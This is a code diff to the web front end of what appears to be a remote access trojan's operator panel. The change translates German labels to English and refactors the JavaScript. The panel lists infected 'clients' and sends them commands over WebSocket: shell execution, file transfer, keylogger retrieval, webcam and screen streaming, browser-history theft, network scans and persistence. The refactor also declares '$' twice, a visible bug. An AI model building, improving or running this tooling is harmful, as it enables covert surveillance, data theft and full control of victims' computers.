@@ -68,6 +68,8 @@
     .output-area {
       background: rgba(17, 24, 39, 0.9);
       font-family: 'Monaco', 'Menlo', monospace;
+      display: flex;
+      flex-direction: column-reverse; /* This is the magic line */
     }
     
     .suggestion-item {
@@ -212,7 +214,7 @@
                    class="command-input w-full px-4 py-3 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500">
             
             <!-- Command Suggestions -->
-            <div id="command-suggestions" class="absolute top-full left-0 right-0 bg-gray-800 border border-gray-600 rounded-lg mt-1 max-h-64 overflow-y-auto z-10 hidden">
+            <div id="command-suggestions" class="absolute bottom-full left-0 right-0 bg-gray-800 border border-gray-600 rounded-lg mb-1 max-h-64 overflow-y-auto z-10 hidden">
               <!-- Suggestions will be populated by JavaScript -->
             </div>
           </div>
@@ -260,9 +262,9 @@
       </div>
 
       <!-- Output and Media Section -->
-      <div class="flex-1 flex flex-col lg:flex-row">
+      <div class="flex-1 flex flex-col lg:flex-row overflow-hidden">
         <!-- Output Area -->
-        <div class="flex-1 flex flex-col p-4">
+        <div class="flex-1 flex flex-col p-4 overflow-hidden">
           <div class="flex items-center justify-between mb-3">
             <h3 class="text-lg font-semibold text-white">Output</h3>
             <button id="copy-output" class="bg-gray-700 hover:bg-gray-600 text-white px-3 py-2 rounded-lg text-sm transition duration-100">
@@ -353,504 +355,538 @@
     </div>
   </div>
 
-  <!-- Server Stats Modal -->
-  <div id="server-stats-loading" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
-    <div class="text-white">Loading server statistics...</div>
+  <!-- Server Stats Loading Indicator -->
+  <div id="server-stats-loading" class="fixed inset-0 bg-black bg-opacity-70 flex-col items-center justify-center z-50 hidden">
+    <div class="text-white text-2xl mb-4">Loading Server Statistics...</div>
+    <div class="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
   </div>
 
   <!-- Notifications Container -->
   <div id="notifications" class="notifications-container space-y-2"></div>
 
   <script>
-    // Global Variables
+    // --- GLOBAL STATE & CONFIG ---
     let ws = null;
     let selectedClients = new Set();
-    let lastClientList = [];
-    let commandHistory = [];
-    let historyIndex = -1;
     let reconnectAttempts = 0;
-    let maxReconnectAttempts = 5;
+    const MAX_RECONNECT_ATTEMPTS = 5;
+    const RECONNECT_DELAY = 3000;
 
-    const commands = [
-        { cmd: '/help', desc: 'Zeigt diese Hilfe an.' },
-        { cmd: '/exec <befehl>', desc: 'Führt einen Shell-Befehl aus.' },
-        { cmd: '/screenshot', desc: 'Nimmt einen Screenshot auf.' },
-        { cmd: '/download <pfad>', desc: 'Lädt eine Datei vom Client herunter.' },
-        { cmd: '/upload', desc: 'Lädt eine Datei auf den Client hoch.' },
-        { cmd: '/ls <pfad>', desc: 'Listet den Inhalt eines Verzeichnisses auf.' },
-        { cmd: '/cd <pfad>', desc: 'Wechselt das Arbeitsverzeichnis.' },
-        { cmd: '/rm <pfad>', desc: 'Löscht eine Datei oder ein Verzeichnis.' },
-        { cmd: '/mkdir <pfad>', desc: 'Erstellt ein neues Verzeichnis.' },
-        { cmd: '/systeminfo', desc: 'Zeigt detaillierte Systeminformationen an.' },
-        { cmd: '/network_info', desc: 'Zeigt Netzwerkinformationen an.' },
-        { cmd: '/history', desc: 'Ruft den Browserverlauf ab.' },
-        { cmd: '/ps', desc: 'Listet laufende Prozesse auf.' },
-        { cmd: '/kill <pid>', desc: 'Beendet einen Prozess.' },
-        { cmd: '/msgbox <text>', desc: 'Zeigt eine Nachrichtenbox an.' },
-        { cmd: '/network_scan <cidr>', desc: 'Scannt das Netzwerk nach Hosts.' },
-        { cmd: '/webcam_list', desc: 'Listet verfügbare Webcams auf.' },
-        { cmd: '/webcam_start <index>', desc: 'Startet den Webcam-Stream.' },
-        { cmd: '/webcam_stop', desc: 'Stoppt den Webcam-Stream.' },
-        { cmd: '/screenstream_start', desc: 'Startet den Bildschirm-Stream.' },
-        { cmd: '/screenstream_stop', desc: 'Stoppt den Bildschirm-Stream.' },
-        { cmd: '/keylogger <bytes>', desc: 'Ruft die letzten Keylogger-Daten ab.' },
-        { cmd: '/persist', desc: 'Aktiviert die Persistenz auf dem Client (Windows).'},
-        { cmd: '/unpersist', desc: 'Deaktiviert die Persistenz auf dem Client (Windows).'},
-        { cmd: '/uninstall', desc: 'Deinstalliert den Client (Windows).'}
+    const COMMANDS = [
+        { cmd: '/help', desc: 'Shows this help message.' },
+        { cmd: '/exec <command>', desc: 'Executes a shell command.' },
+        { cmd: '/screenshot', desc: 'Takes a screenshot.' },
+        { cmd: '/download <path>', desc: 'Downloads a file from the client.' },
+        { cmd: '/upload', desc: 'Uploads a file to the client.' },
+        { cmd: '/ls <path>', desc: 'Lists the contents of a directory.' },
+        { cmd: '/cd <path>', desc: 'Changes the working directory.' },
+        { cmd: '/rm <path>', desc: 'Deletes a file or directory.' },
+        { cmd: '/mkdir <path>', desc: 'Creates a new directory.' },
+        { cmd: '/systeminfo', desc: 'Displays detailed system information.' },
+        { cmd: '/network_info', desc: 'Displays network information.' },
+        { cmd: '/history', desc: 'Retrieves browser history.' },
+        { cmd: '/ps', desc: 'Lists running processes.' },
+        { cmd: '/kill <pid>', desc: 'Terminates a process.' },
+        { cmd: '/msgbox <text>', desc: 'Displays a message box.' },
+        { cmd: '/network_scan <cidr>', desc: 'Scans the network for hosts.' },
+        { cmd: '/webcam_list', desc: 'Lists available webcams.' },
+        { cmd: '/webcam_start <index>', desc: 'Starts the webcam stream.' },
+        { cmd: '/webcam_stop', desc: 'Stops the webcam stream.' },
+        { cmd: '/screenstream_start', desc: 'Starts the screen stream.' },
+        { cmd: '/screenstream_stop', desc: 'Stops the screen stream.' },
+        { cmd: '/keylogger <bytes>', desc: 'Retrieves the latest keylogger data.' },
+        { cmd: '/persist', desc: 'Enables persistence on the client.'},
+        { cmd: '/unpersist', desc: 'Disables persistence on the client.'},
+        { cmd: '/uninstall', desc: 'Uninstalls the client.'}
     ];
 
-    // DOM Elements
-    const mainApp = document.getElementById('main-app');
-    const connectionStatus = document.getElementById('connection-status');
-    const clientList = document.getElementById('client-list');
-    const clientCount = document.getElementById('client-count');
-    const selectedCount = document.getElementById('selected-count');
-    const commandInput = document.getElementById('command-input');
-    const commandSuggestions = document.getElementById('command-suggestions');
-    const sendCommandBtn = document.getElementById('send-command');
-    const outputArea = document.getElementById('output-area');
-    const fileUpload = document.getElementById('file-upload');
-    const uploadBtn = document.getElementById('upload-btn');
-    const screenshotContainer = document.getElementById('screenshot-container');
-    const screenshotImg = document.getElementById('screenshot-img');
-    const screenStreamContainer = document.getElementById('screen-stream-container');
-    const screenCanvas = document.getElementById('screen-canvas');
-    const screenStatus = document.getElementById('screen-status');
-    const webcamContainer = document.getElementById('webcam-container');
-    const webcamCanvas = document.getElementById('webcam-canvas');
-    const webcamStatus = document.getElementById('webcam-status');
-    const mediaPlaceholder = document.getElementById('media-placeholder');
-    const serverStatsBtn = document.getElementById('server-stats-btn');
-    const serverStatsModal = document.getElementById('server-stats-modal');
-    const closeStatsModal = document.getElementById('close-stats-modal');
-    const serverStatsLoading = document.getElementById('server-stats-loading');
-    const serverStatsContent = document.getElementById('server-stats-content');
-    const refreshStats = document.getElementById('refresh-stats');
+    // --- DOM ELEMENT SELECTORS ---
+    const $ = (selector) => document.querySelector(selector);
+    const $ = (selector) => document.querySelectorAll(selector);
 
-    // Utility Functions
+    const DOM = {
+        mainApp: $('#main-app'),
+        connectionStatus: $('#connection-status'),
+        clientList: $('#client-list'),
+        clientCount: $('#client-count'),
+        selectedCount: $('#selected-count'),
+        commandInput: $('#command-input'),
+        commandSuggestions: $('#command-suggestions'),
+        outputArea: $('#output-area'),
+        fileUpload: $('#file-upload'),
+        screenshotContainer: $('#screenshot-container'),
+        screenshotImg: $('#screenshot-img'),
+        screenStreamContainer: $('#screen-stream-container'),
+        screenCanvas: $('#screen-canvas'),
+        screenStatus: $('#screen-status'),
+        webcamContainer: $('#webcam-container'),
+        webcamCanvas: $('#webcam-canvas'),
+        webcamStatus: $('#webcam-status'),
+        mediaPlaceholder: $('#media-placeholder'),
+        serverStatsModal: $('#server-stats-modal'),
+        serverStatsLoading: $('#server-stats-loading'),
+        serverStatsContent: $('#server-stats-content'),
+        notifications: $('#notifications'),
+    };
+
+    // --- UTILITY & HELPER FUNCTIONS ---
     function showNotification(message, type = 'info', duration = 3000) {
-      const notification = document.createElement('div');
-      const colors = {
-        success: 'bg-green-500',
-        error: 'bg-red-500',
-        warning: 'bg-yellow-500',
-        info: 'bg-blue-500'
-      };
-      
-      notification.className = `notification ${colors[type]} text-white px-4 py-3 rounded-lg shadow-lg max-w-sm`;
-      notification.innerHTML = `
-        <div class="flex items-center justify-between">
-          <span>${message}</span>
-          <button onclick="this.parentElement.parentElement.remove()" class="ml-3 text-white hover:text-gray-200">
-            <i class="fas fa-times"></i>
-          </button>
-        </div>
-      `;
-      
-      document.getElementById('notifications').appendChild(notification);
-      
-      if (duration > 0) {
-        setTimeout(() => notification.remove(), duration);
-      }
+        const notification = document.createElement('div');
+        const colors = { success: 'bg-green-500', error: 'bg-red-500', warning: 'bg-yellow-500', info: 'bg-blue-500' };
+        notification.className = `notification ${colors[type]} text-white px-4 py-3 rounded-lg shadow-lg max-w-sm`;
+        notification.innerHTML = `<div class="flex items-center justify-between"><span>${message}</span><button onclick="this.parentElement.parentElement.remove()" class="ml-3 text-white hover:text-gray-200"><i class="fas fa-times"></i></button></div>`;
+        DOM.notifications.appendChild(notification);
+        if (duration > 0) setTimeout(() => notification.remove(), duration);
     }
 
-    function updateConnectionStatus(status, message) {
-      const statusElement = connectionStatus;
-      statusElement.className = 'px-3 py-2 rounded-full text-sm font-medium';
-      
-      switch (status) {
-        case 'connected':
-          statusElement.className += ' bg-green-500 text-green-900';
-          statusElement.innerHTML = '<i class="fas fa-check-circle mr-2"></i>Connected';
-          break;
-        case 'connecting':
-          statusElement.className += ' bg-yellow-500 text-yellow-900';
-          statusElement.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Connecting...';
-          break;
-        case 'disconnected':
-          statusElement.className += ' bg-red-500 text-red-900';
-          statusElement.innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i>Disconnected';
-          break;
-        case 'error':
-          statusElement.className += ' bg-red-600 text-red-100';
-          statusElement.innerHTML = '<i class="fas fa-times-circle mr-2"></i>Error';
-          break;
-      }
+    function updateConnectionStatus(status) {
+        const el = DOM.connectionStatus;
+        el.className = 'px-3 py-2 rounded-full text-sm font-medium';
+        const statuses = {
+            connected: { class: 'bg-green-500 text-green-900', html: '<i class="fas fa-check-circle mr-2"></i>Connected' },
+            connecting: { class: 'bg-yellow-500 text-yellow-900', html: '<i class="fas fa-spinner fa-spin mr-2"></i>Connecting...' },
+            disconnected: { class: 'bg-red-500 text-red-900', html: '<i class="fas fa-exclamation-triangle mr-2"></i>Disconnected' },
+            error: { class: 'bg-red-600 text-red-100', html: '<i class="fas fa-times-circle mr-2"></i>Error' }
+        };
+        el.classList.add(statuses[status].class);
+        el.innerHTML = statuses[status].html;
     }
 
     function logOutput(message, type = 'info') {
-      const timestamp = new Date().toLocaleTimeString();
-      const logEntry = document.createElement('div');
-      logEntry.className = 'mb-2 p-2 rounded';
-      
-      const colors = {
-        info: 'text-gray-300',
-        success: 'text-green-400',
-        error: 'text-red-400',
-        warning: 'text-yellow-400',
-        command: 'text-blue-400'
-      };
-      
-      logEntry.className += ` ${colors[type]}`;
-      logEntry.innerHTML = `<span class="text-gray-500 text-xs">[${timestamp}]</span> ${message}`;
-      
-      outputArea.appendChild(logEntry);
-      outputArea.scrollTop = outputArea.scrollHeight;
-      
-      // Remove placeholder
-      const placeholder = outputArea.querySelector('.text-center');
-      if (placeholder) placeholder.remove();
+        const timestamp = new Date().toLocaleTimeString();
+        const logEntry = document.createElement('div');
+        const colors = { info: 'text-gray-300', success: 'text-green-400', error: 'text-red-400', warning: 'text-yellow-400', command: 'text-blue-400' };
+        logEntry.className = `mt-2 p-2 rounded ${colors[type]}`;
+        logEntry.innerHTML = `<span class="text-gray-500 text-xs mr-2">[${timestamp}]</span> ${message}`;
+        
+        // Remove placeholder if it exists
+        const placeholder = DOM.outputArea.querySelector('.text-center');
+        if (placeholder) placeholder.remove();
+        
+        DOM.outputArea.prepend(logEntry);
     }
 
-    // WebSocket Connection
-    function connectWebSocket() {
-      const token = localStorage.getItem('rat_token');
-      if (!token) {
-        const errorMessage = encodeURIComponent('Kein Authentifizierungstoken gefunden. Bitte anmelden.');
-        window.location.href = `/login?error=${errorMessage}`;
-        return;
-      }
-      
-      updateConnectionStatus('connecting');
-      const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
-      const wsUrl = `${protocol}//${location.host}/ws?token=${encodeURIComponent(token)}`;
-      
-      ws = new WebSocket(wsUrl);
-      
-      ws.onopen = function() {
-        updateConnectionStatus('connected');
-        showNotification('WebSocket connection established', 'success');
-        reconnectAttempts = 0;
-        requestClientList();
-      };
-      
-      ws.onmessage = function(event) {
+    async function fetchWithAuth(url, options = {}) {
+        const token = localStorage.getItem('rat_token');
+        if (!token) {
+            window.location.href = '/login?error=token_missing';
+            return null;
+        }
+        const headers = { ...options.headers, 'Authorization': `Bearer ${token}` };
         try {
-          let data;
-          if (typeof event.data === 'string') {
-            data = JSON.parse(event.data);
-          } else {
-            handleBinaryData(event.data);
-            return;
-          }
-          handleWebSocketMessage(data);
+            const response = await fetch(url, { ...options, headers });
+            if (response.status === 401) {
+                localStorage.removeItem('rat_token');
+                window.location.href = '/login?error=token_invalid';
+                return null;
+            }
+            return response;
         } catch (error) {
-          console.error('Error parsing WebSocket message:', error);
-          logOutput(`Fehler beim Verarbeiten der Nachricht: ${error.message}`, 'error');
+            showNotification('Network error or server is down.', 'error');
+            return null;
         }
-      };
-      
-      ws.onclose = function(event) {
-        updateConnectionStatus('disconnected');
-        if (event.code === 4401) {
-          localStorage.removeItem('rat_token');
-          const errorMessage = encodeURIComponent('Sitzung abgelaufen oder ungültig. Bitte erneut anmelden.');
-          window.location.href = `/login?error=${errorMessage}`;
-        } else if (reconnectAttempts < maxReconnectAttempts) {
-          reconnectAttempts++;
-          showNotification(`Connection lost. Reconnecting... (${reconnectAttempts}/${maxReconnectAttempts})`, 'warning');
-          setTimeout(connectWebSocket, 3000);
-        } else {
-          showNotification('Maximum reconnection attempts reached', 'error');
+    }
+
+    // --- WEBSOCKET LOGIC ---
+    function connectWebSocket() {
+        const token = localStorage.getItem('rat_token');
+        if (!token) {
+            window.location.href = `/login?error=${encodeURIComponent('No auth token found. Please log in.')}`;
+            return;
         }
-      };
-      
-      ws.onerror = function(error) {
-        console.error('WebSocket Error:', error);
-        updateConnectionStatus('error');
-        showNotification('WebSocket Verbindungsfehler', 'error');
-      };
+        
+        updateConnectionStatus('connecting');
+        const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+        ws = new WebSocket(`${protocol}//${location.host}/ws?token=${encodeURIComponent(token)}`);
+        
+        ws.onopen = () => {
+            updateConnectionStatus('connected');
+            showNotification('Connection established.', 'success');
+            reconnectAttempts = 0;
+            requestClientList();
+        };
+        
+        ws.onmessage = (event) => {
+            try {
+                const data = JSON.parse(event.data);
+                handleWebSocketMessage(data);
+            } catch (error) {
+                console.error('Error parsing WebSocket message:', error);
+                logOutput(`Error processing message: ${error.message}`, 'error');
+            }
+        };
+        
+        ws.onclose = (event) => {
+            updateConnectionStatus('disconnected');
+            if (event.code === 4401) { // Custom code for unauthorized
+                localStorage.removeItem('rat_token');
+                window.location.href = `/login?error=${encodeURIComponent('Session expired or invalid. Please log in again.')}`;
+            } else if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
+                reconnectAttempts++;
+                showNotification(`Connection lost. Reconnecting... (${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS})`, 'warning');
+                setTimeout(connectWebSocket, RECONNECT_DELAY);
+            } else {
+                showNotification('Could not reconnect to the server.', 'error');
+            }
+        };
+        
+        ws.onerror = (error) => {
+            console.error('WebSocket Error:', error);
+            updateConnectionStatus('error');
+            showNotification('WebSocket connection error.', 'error');
+        };
     }
 
     function handleWebSocketMessage(data) {
-      switch (data.type) {
-        case 'client_list':
-          updateClientList(data.clients || []);
-          break;
-        case 'client_connected':
-          showNotification(`New client connected: ${data.client.hostname}`, 'success');
-          requestClientList();
-          break;
-        case 'client_disconnected':
-          showNotification(`Client disconnected: ${data.client_id}`, 'warning');
-          selectedClients.delete(data.client_id);
-          updateSelectedCount();
-          requestClientList();
-          break;
-        case 'command_output':
-          logOutput(`<pre>${data.output}</pre>`, 'info');
-          break;
-        case 'screenshot':
-          displayScreenshot(data.data);
-          break;
-        case 'screen_frame':
-          displayScreenFrame(data.data);
-          break;
-        case 'webcam_frame':
-          displayWebcamFrame(data);
-          break;
-        case 'file_download':
-          downloadFile(data.filename, data.data);
-          break;
-        case 'error':
-          logOutput(`Fehler: ${data.message}`, 'error');
-          showNotification(data.message, 'error');
-          break;
-        default:
-          console.log('Unhandled message type:', data.type, data);
-      }
+        const handlers = {
+            'client_list': (d) => updateClientList(d.clients || []),
+            'client_connected': (d) => {
+                showNotification(`New client connected: ${d.client.hostname}`, 'success');
+                requestClientList();
+            },
+            'client_disconnected': (d) => {
+                showNotification(`Client disconnected: ${d.client_id}`, 'warning');
+                selectedClients.delete(d.client_id);
+                updateSelectedCount();
+                requestClientList();
+            },
+            'command_output': (d) => logOutput(`<pre class="whitespace-pre-wrap">${d.output}</pre>`, 'info'),
+            'screenshot': (d) => displayScreenshot(d.data),
+            'screen_frame': (d) => displayStreamFrame(d.data, DOM.screenCanvas, DOM.screenStreamContainer, DOM.screenStatus),
+            'webcam_frame': (d) => displayStreamFrame(d.data, DOM.webcamCanvas, DOM.webcamContainer, DOM.webcamStatus),
+            'file_download': (d) => downloadFile(d.filename, d.data),
+            'error': (d) => {
+                logOutput(`Error: ${d.message}`, 'error');
+                showNotification(d.message, 'error');
+            }
+        };
+        if (handlers[data.type]) {
+            handlers[data.type](data);
+        } else {
+            console.log('Unhandled message type:', data.type, data);
+        }
     }
 
-    function handleBinaryData(data) {
-      const canvas = webcamCanvas;
-      const ctx = canvas.getContext('2d');
-      const blob = new Blob([data], { type: 'image/jpeg' });
-      const url = URL.createObjectURL(blob);
-      const img = new Image();
-      img.onload = function() {
-        canvas.width = img.width;
-        canvas.height = img.height;
-        ctx.drawImage(img, 0, 0);
-        URL.revokeObjectURL(url);
-        webcamContainer.classList.remove('hidden');
-        mediaPlaceholder.classList.add('hidden');
-      };
-      img.src = url;
-    }
-
-    // Client Management
+    // --- CLIENT MANAGEMENT ---
     function updateClientList(clients) {
-      clientList.innerHTML = '';
-      clientCount.textContent = clients.length;
-      lastClientList = clients;
-      
-      if (clients.length === 0) {
-        clientList.innerHTML = `<div class="text-center text-gray-400 py-8"><i class="fas fa-satellite-dish text-3xl mb-3"></i><p>No clients connected</p></div>`;
-        return;
-      }
-      
-      clients.forEach(client => {
-        const clientElement = createClientElement(client);
-        clientList.appendChild(clientElement);
-      });
-      updateSelectedCount();
+        DOM.clientList.innerHTML = '';
+        DOM.clientCount.textContent = clients.length;
+        
+        if (clients.length === 0) {
+            DOM.clientList.innerHTML = `<div class="text-center text-gray-400 py-8"><i class="fas fa-satellite-dish text-3xl mb-3"></i><p>No clients connected</p></div>`;
+            return;
+        }
+        
+        clients.forEach(client => {
+            const clientElement = createClientElement(client);
+            DOM.clientList.appendChild(clientElement);
+        });
+        updateSelectedCount();
     }
 
     function createClientElement(client) {
-      const div = document.createElement('div');
-      div.className = 'client-card glass-effect p-4 rounded-lg cursor-pointer';
-      div.dataset.clientId = client.id;
-      const osIcon = getOSIcon(client.os);
-      const isSelected = selectedClients.has(client.id);
-      if (isSelected) div.classList.add('selected');
-      
-      div.innerHTML = `
-        <div class="flex items-center justify-between mb-2">
-          <div class="flex items-center"><div class="status-dot w-3 h-3 bg-green-400 rounded-full mr-3"></div><i class="${osIcon} text-lg mr-2"></i><span class="font-medium text-white">${client.hostname}</span></div>
-          ${isSelected ? '<i class="fas fa-check-circle text-blue-400"></i>' : ''}
-        </div>
-        <div class="text-sm text-gray-300"><div class="flex justify-between"><span>IP:</span><span>${client.ip}</span></div><div class="flex justify-between"><span>OS:</span><span class="text-xs">${client.os}</span></div></div>`;
-      
-      div.addEventListener('click', () => {
-        toggleClientSelection(client.id);
-        updateClientVisuals();
-      });
-      return div;
-    }
-
-    function getOSIcon(os) {
-      if (!os) return 'fas fa-desktop';
-      const osLower = os.toLowerCase();
-      if (osLower.includes('windows')) return 'fab fa-windows';
-      if (osLower.includes('linux')) return 'fab fa-linux';
-      if (osLower.includes('mac')) return 'fab fa-apple';
-      return 'fas fa-desktop';
-    }
-
-    function toggleClientSelection(clientId) {
-      if (selectedClients.has(clientId)) {
-        selectedClients.delete(clientId);
-      } else {
-        selectedClients.add(clientId);
-      }
-      updateSelectedCount();
+        const div = document.createElement('div');
+        div.className = 'client-card glass-effect p-4 rounded-lg cursor-pointer';
+        div.dataset.clientId = client.id;
+        const osIcon = { 'windows': 'fab fa-windows', 'linux': 'fab fa-linux', 'darwin': 'fab fa-apple' }[client.os.toLowerCase().split(' ')[0]] || 'fas fa-desktop';
+        const isSelected = selectedClients.has(client.id);
+        if (isSelected) div.classList.add('selected');
+        
+        div.innerHTML = `
+            <div class="flex items-center justify-between mb-2">
+                <div class="flex items-center"><div class="status-dot w-3 h-3 bg-green-400 rounded-full mr-3"></div><i class="${osIcon} text-lg mr-2"></i><span class="font-medium text-white">${client.hostname}</span></div>
+                ${isSelected ? '<i class="fas fa-check-circle text-blue-400"></i>' : ''}
+            </div>
+            <div class="text-sm text-gray-300"><div class="flex justify-between"><span>IP:</span><span>${client.ip}</span></div><div class="flex justify-between"><span class="truncate" title="${client.os}">OS:</span><span class="text-xs text-right truncate">${client.os}</span></div></div>`;
+        
+        div.addEventListener('click', () => {
+            if (selectedClients.has(client.id)) selectedClients.delete(client.id);
+            else selectedClients.add(client.id);
+            updateSelectedCount();
+            updateClientVisuals();
+        });
+        return div;
     }
 
     function updateSelectedCount() {
-      selectedCount.textContent = selectedClients.size;
+        DOM.selectedCount.textContent = selectedClients.size;
     }
 
     function updateClientVisuals() {
-      document.querySelectorAll('.client-card').forEach(card => {
-        const clientId = card.dataset.clientId;
-        const checkIcon = card.querySelector('.fa-check-circle');
-        if (selectedClients.has(clientId)) {
-          card.classList.add('selected');
-          if (!checkIcon) card.querySelector('.flex.items-center.justify-between').innerHTML += '<i class="fas fa-check-circle text-blue-400"></i>';
-        } else {
-          card.classList.remove('selected');
-          if (checkIcon) checkIcon.remove();
-        }
-      });
+        $('.client-card').forEach(card => {
+            const clientId = card.dataset.clientId;
+            const checkIcon = card.querySelector('.fa-check-circle');
+            if (selectedClients.has(clientId)) {
+                card.classList.add('selected');
+                if (!checkIcon) card.querySelector('.flex.items-center.justify-between').insertAdjacentHTML('beforeend', '<i class="fas fa-check-circle text-blue-400"></i>');
+            } else {
+                card.classList.remove('selected');
+                if (checkIcon) checkIcon.remove();
+            }
+        });
     }
 
     function requestClientList() {
-      if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify({ action: 'get_clients' }));
-      }
+        if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({ action: 'get_clients' }));
+        }
     }
 
-    // Command Handling
-    function setupCommandInput() {
-      commandInput.addEventListener('input', handleCommandInput);
-      commandInput.addEventListener('keydown', handleCommandKeydown);
-    }
+    // --- COMMAND HANDLING ---
+    function sendCommandToClients() {
+        const command = DOM.commandInput.value.trim();
+        if (!command) return;
 
-    function handleCommandInput() {
-      const value = commandInput.value;
-      if (value.startsWith('/')) {
-        showCommandSuggestions();
-      } else {
+        if (command === '/help') {
+            const helpText = COMMANDS.map(c => `${c.cmd.padEnd(25, ' ')} - ${c.desc}`).join('\n');
+            logOutput(`<pre>${helpText}</pre>`, 'info');
+            DOM.commandInput.value = '';
+            return;
+        }
+
+        if (selectedClients.size === 0) {
+            showNotification('Please select at least one client.', 'warning');
+            return;
+        }
+        
+        const [action, ...args] = command.substring(1).split(' ');
+        const payload = { action, target_ids: Array.from(selectedClients) };
+
+        // This is a simplified parser. A more robust one would be needed for complex args.
+        if (['exec', 'download', 'cd', 'rm', 'mkdir', 'kill', 'msgbox', 'network_scan', 'webcam_start', 'keylogger'].includes(action)) {
+            if (action === 'exec') payload.command = args.join(' ');
+            else if (action === 'msgbox') payload.text = args.join(' ');
+            else if (action === 'kill') payload.pid = args[0];
+            else if (action === 'network_scan') payload.range = args[0];
+            else if (action === 'webcam_start') payload.index = args[0];
+            else if (action === 'keylogger') payload.count = args[0];
+            else payload.path = args[0];
+        }
+        
+        if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify(payload));
+            logOutput(`Command sent: ${command}`, 'command');
+        }
+        
+        DOM.commandInput.value = '';
         hideCommandSuggestions();
-      }
-    }
-
-    function handleCommandKeydown(e) {
-      if (e.key === 'Enter' && !e.shiftKey) {
-        e.preventDefault();
-        sendCommandToClients();
-      }
     }
 
     function showCommandSuggestions() {
-        const value = commandInput.value.toLowerCase();
-        const filtered = commands.filter(cmd => cmd.cmd.toLowerCase().startsWith(value));
-        commandSuggestions.innerHTML = '';
+        const value = DOM.commandInput.value.toLowerCase();
+        const filtered = COMMANDS.filter(c => c.cmd.toLowerCase().startsWith(value));
+        DOM.commandSuggestions.innerHTML = '';
         if (filtered.length > 0) {
             filtered.forEach(cmd => {
                 const div = document.createElement('div');
-                div.className = 'suggestion-item px-4 py-2 cursor-pointer hover:bg-blue-700';
+                div.className = 'suggestion-item px-4 py-2 cursor-pointer';
                 div.innerHTML = `<span class="font-medium text-blue-400">${cmd.cmd}</span> <span class="text-sm text-gray-400">${cmd.desc}</span>`;
                 div.onclick = () => {
-                    commandInput.value = cmd.cmd.split(' ')[0] + ' ';
+                    DOM.commandInput.value = cmd.cmd.split(' ')[0] + ' ';
                     hideCommandSuggestions();
-                    commandInput.focus();
+                    DOM.commandInput.focus();
                 };
-                commandSuggestions.appendChild(div);
+                DOM.commandSuggestions.appendChild(div);
             });
-            commandSuggestions.classList.remove('hidden');
+            DOM.commandSuggestions.classList.remove('hidden');
         } else {
             hideCommandSuggestions();
         }
     }
 
     function hideCommandSuggestions() {
-      commandSuggestions.classList.add('hidden');
+        DOM.commandSuggestions.classList.add('hidden');
     }
 
-    function sendCommandToClients() {
-      const command = commandInput.value.trim();
-      if (!command) return;
-
-      if (command === '/help') {
-          const helpText = commands.map(c => `${c.cmd.padEnd(25, ' ')} - ${c.desc}`).join('\n');
-          logOutput(`<pre>${helpText}</pre>`, 'info');
-          commandInput.value = '';
-          return;
-      }
-
-      if (selectedClients.size === 0) {
-        showNotification('Please select at least one client.', 'warning');
-        return;
-      }
-      
-      const parsedCommand = parseCommand(command);
-      const payload = { ...parsedCommand, target_ids: Array.from(selectedClients) };
-      
-      if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify(payload));
-      }
-      
-      logOutput(`Command sent: ${command}`, 'command');
-      commandInput.value = '';
-      hideCommandSuggestions();
+    // --- MEDIA & FILE HANDLING ---
+    function displayScreenshot(base64Data) {
+        DOM.screenshotImg.src = `data:image/png;base64,${base64Data}`;
+        DOM.screenshotContainer.classList.remove('hidden');
+        DOM.mediaPlaceholder.classList.add('hidden');
     }
 
-    function parseCommand(command) {
-        const parts = command.trim().split(/\s+/);
-        const action = parts[0].startsWith('/') ? parts[0].substring(1) : 'exec';
-        let args = parts.slice(1);
+    function displayStreamFrame(base64Data, canvas, container, statusEl) {
+        const ctx = canvas.getContext('2d');
+        const img = new Image();
+        img.onload = () => {
+            canvas.width = img.width;
+            canvas.height = img.height;
+            ctx.drawImage(img, 0, 0);
+            statusEl.textContent = `Streaming... ${img.width}x${img.height}`;
+        };
+        img.src = `data:image/jpeg;base64,${base64Data}`;
+        container.classList.remove('hidden');
+        DOM.mediaPlaceholder.classList.add('hidden');
+    }
 
-        const result = { action };
-        
-        if (['exec', 'download', 'cd', 'rm', 'mkdir', 'kill', 'msgbox', 'network_scan', 'webcam_start', 'keylogger'].includes(action)) {
-            if (action === 'exec') {
-                result.command = args.join(' ');
-            } else {
-                 result[action === 'kill' ? 'pid' : 'path'] = args[0];
-                 if(action === 'msgbox') result.text = args.join(' ');
-                 if(action === 'network_scan') result.range = args[0];
-                 if(action === 'webcam_start') result.index = args[0];
-                 if(action === 'keylogger') result.count = args[0];
-            }
+    function downloadFile(filename, base64Data) {
+        const link = document.createElement('a');
+        link.href = `data:application/octet-stream;base64,${base64Data}`;
+        link.download = filename;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        showNotification(`Downloaded ${filename}`, 'success');
+    }
+
+    function uploadFile(file) {
+        if (selectedClients.size === 0) {
+            showNotification('Please select a client to upload the file to.', 'warning');
+            return;
         }
-        return result;
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            const payload = {
+                action: 'upload',
+                filename: file.name,
+                data: e.target.result.split(',')[1],
+                target_ids: Array.from(selectedClients)
+            };
+            ws.send(JSON.stringify(payload));
+            logOutput(`Uploading ${file.name} to ${selectedClients.size} client(s)...`, 'command');
+        };
+        reader.readAsDataURL(file);
     }
 
-    // Server Stats, Media Handling, etc. (gekürzt für Übersicht)
-    async function fetchWithAuth(url, options = {}) {
-      const token = localStorage.getItem('rat_token');
-      if (!token) { window.location.href = '/login?error=token_missing'; return; }
-      const headers = { ...options.headers, 'Authorization': `Bearer ${token}` };
-      const response = await fetch(url, { ...options, headers });
-      if (response.status === 401) { localStorage.removeItem('rat_token'); window.location.href = '/login?error=token_invalid'; }
